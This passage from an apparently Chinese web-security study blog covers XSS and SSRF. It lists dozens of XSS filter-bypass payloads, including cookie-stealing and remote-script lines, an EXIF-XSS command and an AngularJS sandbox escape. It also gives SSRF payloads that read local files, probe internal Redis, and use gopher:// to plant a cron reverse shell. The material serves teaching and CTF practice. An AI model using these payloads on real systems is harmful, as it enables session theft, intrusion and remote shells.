invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个参数都用了<code>htmlspecialchars()</code>和<code>mysql_real_escape_string()</code> 安全</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>用户端的输入</li></ol><p>输入过滤<br>推荐白名单，不推荐黑名单，在服务端做。</p><ol start="2"><li>用户端的输出</li></ol><p>输出过滤(重点)<br>推荐HTML编码和JS转义。</p><h2 id="常见XSS题型"><a href="#常见XSS题型" class="headerlink" title="常见XSS题型"></a>常见XSS题型</h2><ol><li>无过滤</li></ol><p><code>?a=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2"><li>escape()函数过滤</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>escape(a)<br></code></pre></td></tr></table></figure><p><code>?a=&#39;;alert(1);//或?a=&#39;;alert(1);&#39;</code></p><ol start="3"><li>javascript重定向与伪链接</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">location.href</span>=a<br></code></pre></td></tr></table></figure><p><code>?a=javascript:alert(1)</code></p><ol start="4"><li>AngularJS沙箱绕过</li></ol><p>如果使用了AngularJS框架（version1.2-1.5）<br>如果payload：?a&#x3D;4传回值4，说明可能存在XSS<br>构造payload：<code>&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;</code></p><ol start="5"><li>bypass_csp</li></ol><p>参考<a href="https://xz.aliyun.com/t/9254#toc-6">https://xz.aliyun.com/t/9254#toc-6</a></p><h2 id="xss语句"><a href="#xss语句" class="headerlink" title="xss语句"></a>xss语句</h2><h3 id="弹窗函数"><a href="#弹窗函数" class="headerlink" title="弹窗函数"></a>弹窗函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">alert()<br>confirm()<br>prompt()<br></code></pre></td></tr></table></figure><h3 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&lt;img src=1 οnerrοr=alert(1)&gt;<br>&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;alert(/1/)&lt;/script&gt;<br>&quot;/&gt;&lt;svg/οnlοad=prompt(/1/);&gt;<br>&lt;input id=&quot;aaa&quot; type=&quot;text&quot; value=&quot;输出点&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br>&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;<br>%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br>%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html<br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;<br>&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;<br>&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;<br>&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;<br>&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;<br>&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;<br>&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br>&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;<br>&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="特殊利用"><a href="#特殊利用" class="headerlink" title="特殊利用"></a>特殊利用</h2><p>获取Cookie</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">alert</span><span class="hljs-params">(document.cookie)</span></span><br></code></pre></td></tr></table></figure><p>PDF-XSS</p><p><a href="https://github.com/ynsmroztas/pdfsvgxsspayload">https://github.com/ynsmroztas/pdfsvgxsspayload</a></p><p>svg-XSS</p><p><a href="https://github.com/ynsmroztas/pdfsvgxsspayload">https://github.com/ynsmroztas/pdfsvgxsspayload</a></p><p>EXIF-XSS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">exiftool -artist=&#x27;&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerrror</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span>&#x27; test.jpg<br></code></pre></td></tr></table></figure><p>文件上传XSS</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>XSS平台</p><p><a href="https://xsshs.cn/">https://xsshs.cn/</a><br><a href="https://xss.pt/">https://xss.pt/</a><br><a href="http://xsscom.com/">http://xsscom.com</a></p><p>XSStrike</p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>xsscrapy</p><p><a href="https://github.com/DanMcInerney/xsscrapy">https://github.com/DanMcInerney/xsscrapy</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/01/SSRF/"/>
    <url>/2023/01/01/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三、漏洞函数"><a href="#三、漏洞函数" class="headerlink" title="三、漏洞函数"></a>三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code></p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四、协议"><a href="#四、协议" class="headerlink" title="四、协议"></a>四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> ，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http-和https"><a href="#http-和https" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;</h3><p>探测内网主机存活</p><h2 id="五、绕过方式"><a href="#五、绕过方式" class="headerlink" title="五、绕过方式"></a>五、绕过方式</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127-0-0-1等本地ip"><a href="#绕过127-0-0-1等本地ip" class="headerlink" title="绕过127.0.0.1等本地ip"></a>绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换"><a href="#ip的进制转换" class="headerlink" title="ip的进制转换"></a>ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ 